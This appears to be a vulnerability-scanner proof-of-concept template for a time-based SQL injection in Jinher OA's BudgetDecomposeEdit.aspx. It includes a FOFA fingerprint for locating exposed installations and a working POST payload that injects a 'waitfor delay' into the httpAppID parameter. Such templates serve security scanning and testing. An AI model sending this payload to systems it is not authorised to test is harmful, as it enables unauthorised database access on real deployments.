id: poc-yaml-jinher-jhsoft-budgetdecomposeedit-aspx-sqli
info:
  name: 金和OA BudgetDecomposeEdit.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: POST
  path: /c6/JHSoft.Web.CostControl/Decompose/BudgetDecomposeEdit.aspx/
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: httpAppID=1%27waitfor+delay%270:0:{{.t1}}%27--&httpOID=1
  expression: 'status_code == 200 &&

    body == "" &&

    contains(headers,"Cookie:") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
